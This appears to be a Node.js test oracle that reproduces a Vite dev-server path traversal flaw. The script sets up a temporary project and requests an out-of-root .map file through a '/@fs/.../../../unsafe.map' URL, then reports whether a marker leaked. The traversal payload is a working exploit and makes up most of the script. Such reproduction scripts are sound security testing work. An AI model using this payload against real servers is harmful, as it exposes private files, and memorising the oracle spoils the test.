const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'root');
    const srcDir = path.join(root, 'src');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(
      path.join(root, 'index.html'),
      '<!doctype html><html><body><script type="module" src="/src/main.js"></script></body></html>'
    );
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const ok = 7; console.log(ok);');
    fs.writeFileSync(path.join(depsDir, 'dummy.js'), 'export const dummy = 1;');
    fs.writeFileSync(
      outsideMap,
      JSON.stringify({ version: 3, file: 'x.js', sources: [], names: [], mappings: '', secret: marker })
    );

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { host: true, port: 0, fs: { strict: true } },
      optimizeDeps: { noDiscovery: true }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('ok = 7') === -1) {
      throw new Error('benign transform did not return expected module');
    }

    operation_completed = true;

    const absDepsPosix = depsDir.split(path.sep).join('/');
    const maliciousUrl = '/@fs/' + absDepsPosix + '/../../../unsafe.map';

    const req = { url: maliciousUrl, method: 'GET', headers: {} };

    let statusCode = 0;
    let headers = {};
    let chunks = [];

    const res = {
      writableEnded: false,
      setHeader(name, value) {
        headers[String(name).toLowerCase()] = String(value);
      },
      getHeader(name) {
        return headers[String(name).toLowerCase()];
      },
      removeHeader(name) {
        delete headers[String(name).toLowerCase()];
      },
      writeHead(code, hdrs) {
        statusCode = code;
        if (hdrs && typeof hdrs === 'object') {
          for (const k of Object.keys(hdrs)) {
            headers[String(k).toLowerCase()] = String(hdrs[k]);
          }
        }
      },
      statusCode: 200,
      end(data) {
        if (typeof data !== 'undefined') chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
        this.writableEnded = true;
      }
    };

    await new Promise((resolve, reject) => {
      server.middlewares(req, res, (err) => {
        if (err) reject(err);
        else resolve();
      });
      setImmediate(resolve);
    });

    const body = Buffer.concat(chunks).toString('utf8');
    const sc = statusCode || res.statusCode || 0;

    if (sc === 200 && body.includes(marker)) {
      exploit_succeeded = true;
      evidence = 'traversal map request returned marker from out-of-root file';
    } else {
      exploit_succeeded = false;
      evidence = 'map traversal did not disclose marker (status=' + sc + ', body_len=' + body.length + ')';
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try {
        await server.close();
      } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();